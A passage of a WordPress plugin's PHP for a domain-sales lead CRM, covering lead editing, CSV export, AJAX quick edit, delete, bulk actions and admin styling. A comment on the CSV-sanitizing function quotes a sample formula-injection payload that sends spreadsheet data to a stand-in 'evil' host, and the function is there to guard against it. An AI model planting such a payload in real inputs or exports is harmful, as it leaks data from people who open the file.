								<td><input type="text" id="name" name="name" class="regular-text" value="<?php echo esc_attr( $lead['name'] ); ?>"></td>
							</tr>
							<tr>
								<th><label for="email">Email *</label></th>
								<td><input type="email" id="email" name="email" class="regular-text" value="<?php echo esc_attr( $lead['email'] ); ?>" required></td>
							</tr>
							<tr>
								<th><label for="phone">Phone</label></th>
								<td><input type="text" id="phone" name="phone" class="regular-text" value="<?php echo esc_attr( $lead['phone'] ); ?>"></td>
							</tr>
							<tr>
								<th><label for="offer_amount">Offer Amount ($)</label></th>
								<td><input type="number" id="offer_amount" name="offer_amount" step="0.01" min="0" class="regular-text" value="<?php echo esc_attr( $lead['offer_amount'] ); ?>"></td>
							</tr>
							<tr>
								<th><label for="message">Message</label></th>
								<td><textarea id="message" name="message" rows="5" class="large-text"><?php echo esc_textarea( $lead['message'] ); ?></textarea></td>
							</tr>
						</table>
					</div>
					<div class="db-crm-form-col">
						<h3>CRM Details</h3>
						<table class="form-table">
							<tr>
								<th><label for="status">Status</label></th>
								<td>
									<select id="status" name="status">
										<?php foreach ( array( 'new', 'contacted', 'negotiating', 'won', 'lost' ) as $s ) : ?>
											<option value="<?php echo esc_attr( $s ); ?>" <?php selected( $lead['status'], $s ); ?>><?php echo esc_html( ucfirst( $s ) ); ?></option>
										<?php endforeach; ?>
									</select>
								</td>
							</tr>
							<tr>
								<th><label for="source">Source</label></th>
								<td>
									<select id="source" name="source">
										<option value="offer_form" <?php selected( $lead['source'], 'offer_form' ); ?>>Offer Form</option>
										<option value="direct" <?php selected( $lead['source'], 'direct' ); ?>>Direct</option>
										<option value="referral" <?php selected( $lead['source'], 'referral' ); ?>>Referral</option>
									</select>
								</td>
							</tr>
							<tr>
								<th><label for="notes">Notes</label></th>
								<td><textarea id="notes" name="notes" rows="4" class="large-text"><?php echo esc_textarea( $lead['notes'] ); ?></textarea></td>
							</tr>
							<tr>
								<th><label for="admin_notes">Admin Notes</label></th>
								<td><textarea id="admin_notes" name="admin_notes" rows="4" class="large-text"><?php echo esc_textarea( $lead['admin_notes'] ); ?></textarea></td>
							</tr>
						</table>
					</div>
				</div>

				<p class="submit">
					<input type="submit" class="button button-primary button-large" value="<?php echo $lead_id ? 'Update Lead' : 'Save Lead'; ?>">
					<a href="<?php echo esc_url( admin_url( 'admin.php?page=db-crm-leads' ) ); ?>" class="button button-large">Cancel</a>
				</p>
			</form>
		</div>
		<?php
	}
}

/* ==========================================================================
   10. EXPORT PLACEHOLDER PAGE (redirect handled by admin_init)
   ========================================================================== */

if ( ! function_exists( 'db_crm_page_export_placeholder' ) ) {
	function db_crm_page_export_placeholder() {
		$url = wp_nonce_url(
			admin_url( 'admin.php?page=db-crm-export&db_crm_export=1' ),
			'db_crm_export'
		);
		?>
		<div class="wrap db-crm-wrap">
			<h1>Export Leads CSV</h1>
			<p>Click the button below to download all leads as a CSV file.</p>
			<a href="<?php echo esc_url( $url ); ?>" class="button button-primary button-large">Download CSV</a>
			<h3>Export by Status</h3>
			<ul>
				<?php foreach ( array( 'new', 'contacted', 'negotiating', 'won', 'lost' ) as $s ) : ?>
					<li>
						<a href="<?php echo esc_url( wp_nonce_url( admin_url( 'admin.php?page=db-crm-export&db_crm_export=1&status=' . rawurlencode( $s ) ), 'db_crm_export' ) ); ?>">
							<?php echo esc_html( ucfirst( $s ) ); ?> leads
						</a>
					</li>
				<?php endforeach; ?>
			</ul>
		</div>
		<?php
	}
}

/* ==========================================================================
   11. CSV EXPORT
   ========================================================================== */

if ( ! function_exists( 'db_crm_csv_safe' ) ) {
	/**
	 * Neutralizes spreadsheet formula injection. Lead fields originate from
	 * the public, unauthenticated offer form — a value like
	 * '=HYPERLINK("http://evil/?"&A1,"open")' would execute as a live
	 * formula the moment an admin opens the exported CSV in Excel/Sheets.
	 */
	function db_crm_csv_safe( $value ) {
		$value = (string) $value;
		if ( '' !== $value && false !== strpos( "=+-@\t", $value[0] ) ) {
			return "'" . $value;
		}
		return $value;
	}
}

add_action( 'admin_init', function() {
	if (
		! isset( $_GET['db_crm_export'] ) ||
		$_GET['db_crm_export'] !== '1'
	) {
		return;
	}

	if ( ! current_user_can( 'manage_options' ) ) {
		wp_die( esc_html__( 'Unauthorized.', 'db-blocks' ) );
	}

	if (
		! isset( $_GET['_wpnonce'] ) ||
		! wp_verify_nonce( sanitize_text_field( wp_unslash( $_GET['_wpnonce'] ) ), 'db_crm_export' )
	) {
		wp_die( esc_html__( 'Security check failed.', 'db-blocks' ) );
	}

	global $wpdb;
	$table = $wpdb->prefix . 'db_leads';

	$where = '';
	if ( isset( $_GET['status'] ) ) {
		$s = sanitize_text_field( wp_unslash( $_GET['status'] ) );
		if ( in_array( $s, array( 'new', 'contacted', 'negotiating', 'won', 'lost' ), true ) ) {
			$where = $wpdb->prepare( ' WHERE status = %s', $s );
		}
	}

	// phpcs:ignore WordPress.DB.DirectDatabaseQuery,WordPress.DB.PreparedSQL.InterpolatedNotPrepared
	$leads = $wpdb->get_results(
		"SELECT id, domain, name, email, phone, offer_amount, status, source, message, admin_notes, created_at FROM {$table}" . $where . " ORDER BY created_at DESC",
		ARRAY_A
	);

	$filename = 'db-leads-' . gmdate( 'Y-m-d' ) . '.csv';

	// Output CSV
	if ( ob_get_length() ) {
		ob_end_clean();
	}

	header( 'Content-Type: text/csv; charset=UTF-8' );
	header( 'Content-Disposition: attachment; filename="' . $filename . '"' );
	header( 'Pragma: no-cache' );
	header( 'Expires: 0' );

	$out = fopen( 'php://output', 'w' );
	// BOM for Excel UTF-8 compatibility
	fprintf( $out, chr( 0xEF ) . chr( 0xBB ) . chr( 0xBF ) );

	fputcsv( $out, array( 'ID', 'Domain', 'Name', 'Email', 'Phone', 'Offer Amount', 'Status', 'Source', 'Message', 'Admin Notes', 'Created' ) );

	foreach ( $leads as $lead ) {
		fputcsv( $out, array(
			$lead['id'],
			db_crm_csv_safe( $lead['domain'] ),
			db_crm_csv_safe( $lead['name'] ),
			db_crm_csv_safe( $lead['email'] ),
			db_crm_csv_safe( $lead['phone'] ),
			$lead['offer_amount'] !== null ? number_format( (float) $lead['offer_amount'], 2 ) : '',
			// Belt-and-suspenders: status/source are now whitelisted at
			// every write path, but any row written before that guard
			// existed everywhere could still carry an arbitrary string.
			db_crm_csv_safe( $lead['status'] ),
			db_crm_csv_safe( $lead['source'] ),
			db_crm_csv_safe( $lead['message'] ),
			db_crm_csv_safe( $lead['admin_notes'] ),
			$lead['created_at'],
		) );
	}

	fclose( $out );
	exit;
} );

/* ==========================================================================
   12. AJAX — QUICK EDIT SAVE
   ========================================================================== */

add_action( 'wp_ajax_db_crm_quick_edit', function() {
	if ( ! current_user_can( 'manage_options' ) ) {
		wp_send_json_error( 'Unauthorized.' );
	}

	$lead_id = isset( $_POST['lead_id'] ) ? absint( $_POST['lead_id'] ) : 0;
	if ( ! $lead_id ) {
		wp_send_json_error( 'Invalid lead ID.' );
	}

	if (
		! isset( $_POST['nonce'] ) ||
		! wp_verify_nonce( sanitize_text_field( wp_unslash( $_POST['nonce'] ) ), 'db_crm_quick_edit_' . $lead_id )
	) {
		wp_send_json_error( 'Security check failed.' );
	}

	global $wpdb;
	$table = $wpdb->prefix . 'db_leads';

	$allowed_statuses = db_crm_allowed_statuses();
	$status           = sanitize_text_field( wp_unslash( $_POST['status'] ?? 'new' ) );
	if ( ! in_array( $status, $allowed_statuses, true ) ) {
		wp_send_json_error( 'Invalid status.' );
	}

	$admin_notes  = sanitize_textarea_field( wp_unslash( $_POST['admin_notes'] ?? '' ) );
	// db_crm_clean_offer_amount(), matching the create and edit-lead-save
	// paths — a type="number" input mostly keeps this clean client-side,
	// but $_POST is scriptable and some locales render a number input's
	// decimal separator as a comma, which a bare floatval() truncates at.
	$offer_amount = isset( $_POST['offer_amount'] ) ? db_crm_clean_offer_amount( wp_unslash( $_POST['offer_amount'] ) ) : null;

	$data    = array( 'status' => $status, 'admin_notes' => $admin_notes );
	$formats = array( '%s', '%s' );

	// Include offer_amount whenever the field was submitted at all — even
	// when it resolves to null (the admin cleared it). The previous
	// `if ($offer_amount !== null)` guard meant clearing the field only
	// ever updated the admin's own browser: the key was never added to
	// $data, so the UPDATE never touched the column and the old value
	// stayed in the database while the UI reported success.
	if ( isset( $_POST['offer_amount'] ) ) {
		$data['offer_amount'] = $offer_amount;
		$formats[]            = $offer_amount !== null ? '%f' : null;
	}

	// phpcs:ignore WordPress.DB.DirectDatabaseQuery
	$result = $wpdb->update( $table, $data, array( 'id' => $lead_id ), $formats, array( '%d' ) );

	if ( false === $result ) {
		wp_send_json_error( 'Database error.' );
	}

	wp_send_json_success( array(
		'status'      => $status,
		'pill_html'   => db_crm_status_pill( $status ),
		'admin_notes' => $admin_notes,
		'offer'       => $offer_amount !== null ? number_format( $offer_amount, 2 ) : null,
	) );
} );

/* ==========================================================================
   13. AJAX — DELETE LEAD
   ========================================================================== */

add_action( 'wp_ajax_db_crm_delete_lead', function() {
	if ( ! current_user_can( 'manage_options' ) ) {
		wp_die( esc_html__( 'Unauthorized.', 'db-blocks' ) );
	}

	$lead_id = isset( $_GET['id'] ) ? absint( $_GET['id'] ) : 0;
	if ( ! $lead_id ) {
		wp_die( esc_html__( 'Invalid lead ID.', 'db-blocks' ) );
	}

	if (
		! isset( $_GET['_wpnonce'] ) ||
		! wp_verify_nonce( sanitize_text_field( wp_unslash( $_GET['_wpnonce'] ) ), 'db_crm_delete_' . $lead_id )
	) {
		wp_die( esc_html__( 'Security check failed.', 'db-blocks' ) );
	}

	global $wpdb;
	$table = $wpdb->prefix . 'db_leads';
	// phpcs:ignore WordPress.DB.DirectDatabaseQuery
	$wpdb->delete( $table, array( 'id' => $lead_id ), array( '%d' ) );

	wp_safe_redirect( admin_url( 'admin.php?page=db-crm-leads&lead_deleted=1' ) );
	exit;
} );

/* ==========================================================================
   14. AJAX — BULK ACTION (via AJAX fallback)
   ========================================================================== */

add_action( 'wp_ajax_db_crm_bulk_action', function() {
	if ( ! current_user_can( 'manage_options' ) ) {
		wp_send_json_error( 'Unauthorized.' );
	}

	if (
		! isset( $_POST['nonce'] ) ||
		! wp_verify_nonce( sanitize_text_field( wp_unslash( $_POST['nonce'] ) ), 'db_crm_bulk_action' )
	) {
		wp_send_json_error( 'Security check failed.' );
	}

	$allowed_statuses = db_crm_allowed_statuses();
	$new_status       = sanitize_text_field( wp_unslash( $_POST['status'] ?? '' ) );
	if ( ! in_array( $new_status, $allowed_statuses, true ) ) {
		wp_send_json_error( 'Invalid status.' );
	}

	$ids = isset( $_POST['ids'] ) && is_array( $_POST['ids'] ) ? array_map( 'absint', $_POST['ids'] ) : array();
	if ( empty( $ids ) ) {
		wp_send_json_error( 'No IDs provided.' );
	}

	global $wpdb;
	$table = $wpdb->prefix . 'db_leads';
	foreach ( $ids as $lid ) {
		// phpcs:ignore WordPress.DB.DirectDatabaseQuery
		$wpdb->update( $table, array( 'status' => $new_status ), array( 'id' => $lid ), array( '%s' ), array( '%d' ) );
	}

	wp_send_json_success( array( 'updated' => count( $ids ) ) );
} );

/* ==========================================================================
   15. DASHBOARD WIDGET
   ========================================================================== */

add_action( 'wp_dashboard_setup', function() {
	wp_add_dashboard_widget(
		'db_crm_widget',
		'Domain Brothers &mdash; Recent Leads',
		'db_crm_dashboard_widget'
	);
} );

if ( ! function_exists( 'db_crm_dashboard_widget' ) ) {
	function db_crm_dashboard_widget() {
		global $wpdb;
		$table = $wpdb->prefix . 'db_leads';

		// phpcs:ignore WordPress.DB.DirectDatabaseQuery
		$leads = $wpdb->get_results(
			"SELECT id, domain, name, status, created_at FROM {$table} ORDER BY created_at DESC LIMIT 5",
			ARRAY_A
		);

		if ( empty( $leads ) ) {
			echo '<p>No leads yet.</p>';
		} else {
			echo '<table class="db-crm-widget-table" style="width:100%;border-collapse:collapse;">';
			echo '<thead><tr><th style="text-align:left;padding:4px 8px;font-size:11px;color:#666;">Domain</th><th style="text-align:left;padding:4px 8px;font-size:11px;color:#666;">Name</th><th style="text-align:left;padding:4px 8px;font-size:11px;color:#666;">Status</th><th style="text-align:left;padding:4px 8px;font-size:11px;color:#666;">Received</th></tr></thead>';
			echo '<tbody>';
			foreach ( $leads as $lead ) {
				$edit_url = admin_url( 'admin.php?page=db-crm-add-lead&lead_id=' . (int) $lead['id'] );
				echo '<tr style="border-top:1px solid #f0f0f0;">';
				echo '<td style="padding:6px 8px;"><a href="' . esc_url( $edit_url ) . '">' . esc_html( $lead['domain'] ) . '</a></td>';
				echo '<td style="padding:6px 8px;">' . esc_html( $lead['name'] ?: '—' ) . '</td>';
				echo '<td style="padding:6px 8px;">' . db_crm_status_pill( $lead['status'] ) . '</td>';
				echo '<td style="padding:6px 8px;font-size:11px;color:#888;">' . esc_html( db_crm_time_ago( $lead['created_at'] ) ) . '</td>';
				echo '</tr>';
			}
			echo '</tbody></table>';
		}

		echo '<p style="margin-top:12px;text-align:right;"><a href="' . esc_url( admin_url( 'admin.php?page=db-crm-leads' ) ) . '" class="button button-small">View All Leads &rarr;</a></p>';
	}
}

/* ==========================================================================
   16. ENQUEUE ADMIN CSS + JS
   ========================================================================== */

add_action( 'admin_enqueue_scripts', function( $hook ) {
	// Only enqueue on our own pages and the dashboard
	$our_pages = array(
		'toplevel_page_db-crm-leads',
		'domain-brothers_page_db-crm-add-lead',
		'domain-brothers_page_db-crm-export',
		'index.php', // dashboard
	);

	$screen = function_exists( 'get_current_screen' ) ? get_current_screen() : null;
	if ( ! $screen ) {
		return;
	}

	if ( ! in_array( $screen->id, $our_pages, true ) ) {
		return;
	}

	wp_register_style( 'db-crm-admin', false );
	wp_enqueue_style( 'db-crm-admin' );
	wp_add_inline_style( 'db-crm-admin', db_crm_get_admin_css() );

	wp_register_script( 'db-crm-admin-js', false, array( 'jquery' ), DB_CRM_TABLE_VERSION, true );
	wp_enqueue_script( 'db-crm-admin-js' );
	wp_add_inline_script( 'db-crm-admin-js', db_crm_get_admin_js() );

	wp_localize_script( 'db-crm-admin-js', 'dbCrmData', array(
		'ajaxUrl'   => admin_url( 'admin-ajax.php' ),
		'bulkNonce' => wp_create_nonce( 'db_crm_bulk_action' ),
	) );
} );

/* ==========================================================================
   17. ADMIN CSS
   ========================================================================== */

if ( ! function_exists( 'db_crm_get_admin_css' ) ) {
	function db_crm_get_admin_css(): string {
		return <<<'CSS'
/* ============================================================
   DB CRM Admin Styles
   ============================================================ */

/* Wrap */
.db-crm-wrap h1 { margin-bottom: 16px; }

/* Stats bar */
.db-crm-stats-bar {
	display: flex;
	gap: 16px;
	flex-wrap: wrap;
	margin-bottom: 20px;
}
.db-crm-stat {
	background: #fff;
	border: 1px solid #e0e0e0;
	border-radius: 6px;
	padding: 14px 20px;
	min-width: 120px;
	display: flex;
	flex-direction: column;
	align-items: center;
	box-shadow: 0 1px 3px rgba(0,0,0,.05);
}
.db-crm-stat__num {
	font-size: 26px;
	font-weight: 700;
	line-height: 1.1;
	color: #1d2327;
}
.db-crm-stat__num--blue  { color: #2271b1; }
.db-crm-stat__num--green { color: #00a32a; }
.db-crm-stat__label {
	font-size: 11px;
	text-transform: uppercase;
	letter-spacing: .06em;
	color: #787c82;
	margin-top: 4px;
}

/* Filter tabs */
.db-crm-filter-tabs {
	margin-bottom: 10px;
}
.db-crm-filter-tabs li { display: inline; }
.db-crm-filter-tabs a { text-decoration: none; }
.db-crm-filter-tabs a.current { font-weight: 600; }

/* Table */
.db-crm-table { margin-top: 6px; }
.db-crm-table td,
.db-crm-table th { vertical-align: middle; }

/* Contact stack cell */
.db-crm-contact-stack {
	display: flex;
	flex-direction: column;
	gap: 2px;
	font-size: 13px;
}
.db-crm-contact-stack a { color: #2271b1; text-decoration: none; }
.db-crm-contact-stack a:hover { text-decoration: underline; }

/* Action links */
.db-crm-actions a { font-size: 12px; }

/* Status pills */
.db-crm-pill {
	display: inline-block;
	padding: 2px 10px;
	border-radius: 20px;
	font-size: 11px;
	font-weight: 600;
	text-transform: uppercase;
	letter-spacing: .04em;
	line-height: 1.6;
}
.db-crm-pill--new         { background: #e8f0fe; color: #2271b1; }
.db-crm-pill--contacted   { background: #fff3cd; color: #856404; }
.db-crm-pill--negotiating { background: #ede7f6; color: #5e35b1; }
.db-crm-pill--won         { background: #d4edda; color: #155724; }
.db-crm-pill--lost        { background: #f5f5f5; color: #787c82; }

/* Quick edit row */
.db-crm-quick-edit-row td { padding: 0 !important; }
.db-crm-quick-edit-panel {
	background: #f6f7f7;
	border: 1px solid #c3c4c7;
	border-radius: 4px;
	padding: 16px 20px;
	margin: 4px 0;
}
.db-crm-quick-edit-panel h4 {
	margin: 0 0 12px;
	font-size: 13px;
	font-weight: 600;
}
.db-crm-qe-fields {
	display: flex;
	gap: 16px;
	flex-wrap: wrap;
	margin-bottom: 12px;
}
.db-crm-qe-field {
	display: flex;
	flex-direction: column;
	gap: 4px;
	min-width: 160px;
}
.db-crm-qe-field--wide { flex: 1 1 300px; }
.db-crm-qe-field label { font-size: 12px; font-weight: 600; color: #3c434a; }
.db-crm-qe-field select,
.db-crm-qe-field input,
.db-crm-qe-field textarea { font-size: 13px; width: 100%; }
.db-crm-qe-actions { display: flex; align-items: center; gap: 8px; }
.db-crm-qe-msg { font-size: 12px; color: #00a32a; }

/* Add/Edit form */
.db-crm-lead-form .db-crm-form-grid {
	display: grid;
	grid-template-columns: 1fr 1fr;
	gap: 24px;
	margin-bottom: 20px;
}
.db-crm-lead-form .db-crm-form-col { background: #fff; border: 1px solid #e0e0e0; border-radius: 6px; padding: 20px 24px; }
.db-crm-lead-form h3 { margin-top: 0; border-bottom: 1px solid #e0e0e0; padding-bottom: 8px; }
.db-crm-lead-form .form-table td { padding-left: 0; }

/* Dashboard widget */
.db-crm-widget-table { font-size: 12px; }

/* Mobile */
@media (max-width: 782px) {
	.db-crm-stats-bar { gap: 10px; }
	.db-crm-stat { min-width: calc(50% - 10px); }
	.db-crm-lead-form .db-crm-form-grid { grid-template-columns: 1fr; }
	.db-crm-table .db-crm-contact-stack span:nth-child(n+3) { display: none; }
}
@media (max-width: 600px) {
	.db-crm-stat { min-width: 100%; }
	.db-crm-qe-fields { flex-direction: column; }
}
CSS;
	}
}

/* ==========================================================================
   18. ADMIN JS
   ========================================================================== */

if ( ! function_exists( 'db_crm_get_admin_js' ) ) {
	function db_crm_get_admin_js(): string {
		return <<<'JS'
(function($) {
	'use strict';

	// ---- Check-all checkbox ----
	$(document).on('change', '#db-crm-check-all', function() {
		$('input[name="lead_ids[]"]').prop('checked', this.checked);
	});

	// ---- Quick Edit toggle ----
	$(document).on('click', '.db-crm-quick-edit-btn', function(e) {
		e.preventDefault();
		var $btn   = $(this);
		var id     = $btn.data('id');
		var $row   = $('#db-crm-qe-row-' + id);

		// Close any other open quick-edit rows
		$('.db-crm-quick-edit-row').not($row).hide();

		// Populate fields from data attributes
		$row.find('.db-crm-qe-status').val($btn.data('status'));
		$row.find('.db-crm-qe-notes').val($btn.data('admin-notes'));
		var offer = $btn.data('offer');
		$row.find('.db-crm-qe-offer').val(offer !== '' ? offer : '');

		$row.toggle();
	});

	// ---- Quick Edit cancel ----
	$(document).on('click', '.db-crm-qe-cancel', function() {
		$(this).closest('.db-crm-quick-edit-row').hide();
	});

	// ---- Quick Edit save (AJAX) ----
	$(document).on('click', '.db-crm-qe-save', function() {
		var $btn   = $(this);
		var $panel = $btn.closest('.db-crm-quick-edit-panel');
		var $row   = $btn.closest('.db-crm-quick-edit-row');
		var $msg   = $panel.find('.db-crm-qe-msg');
		var id     = $btn.data('id');
		var nonce  = $btn.data('nonce');

		$btn.prop('disabled', true).text('Saving…');
		$msg.text('').css('color', '#00a32a');

		$.post(dbCrmData.ajaxUrl, {
			action:       'db_crm_quick_edit',
			lead_id:      id,
			nonce:        nonce,
			status:       $panel.find('.db-crm-qe-status').val(),
			admin_notes:  $panel.find('.db-crm-qe-notes').val(),
			offer_amount: $panel.find('.db-crm-qe-offer').val()
		})
		.done(function(resp) {
			if (resp.success) {
				// Update status pill in the main row
				var $mainRow = $row.prev('tr');
				$mainRow.find('.db-crm-pill').replaceWith(resp.data.pill_html);
				// Offer is the 3rd <td> (Domain, Contact, Offer, ...) — the
				// checkbox cell is a <th> so it isn't counted by td:eq().
				// This used to write into the Status cell (td:eq(3)) instead,
				// wiping the pill just replaced above.
				if (resp.data.offer !== null) {
					$mainRow.find('td:eq(2)').text('$' + resp.data.offer);
				}
				// Update the quick-edit trigger's data attr
				$mainRow.find('.db-crm-quick-edit-btn')
					.data('status', resp.data.status)
					.data('admin-notes', resp.data.admin_notes);
				$msg.text('Saved!');
				setTimeout(function() { $row.hide(); }, 700);
			} else {
				$msg.css('color', '#cc0000').text(resp.data || 'Error saving.');
			}
		})
		.fail(function() {
			$msg.css('color', '#cc0000').text('Network error.');
		})
		.always(function() {
			$btn.prop('disabled', false).text('Save');
		});
	});

	// ---- Delete confirmation ----
	$(document).on('click', '.db-crm-delete-btn', function(e) {
		if (!confirm('Delete this lead? This cannot be undone.')) {
			e.preventDefault();
		}
	});

	// ---- Bulk action confirmation ----
	$(document).on('submit', '#db-crm-bulk-form', function(e) {
		var action = $('#bulk-action-selector-top').val();
		if (action === '-1') {
			alert('Please select a bulk action.');
			e.preventDefault();
			return;
		}
		var checked = $('input[name="lead_ids[]"]:checked').length;
		if (checked === 0) {
			alert('Please select at least one lead.');
			e.preventDefault();
			return;
		}
		if (!confirm('Apply "' + action + '" to ' + checked + ' lead(s)?')) {
			e.preventDefault();
		}
	});

})(jQuery);
JS;
	}
}
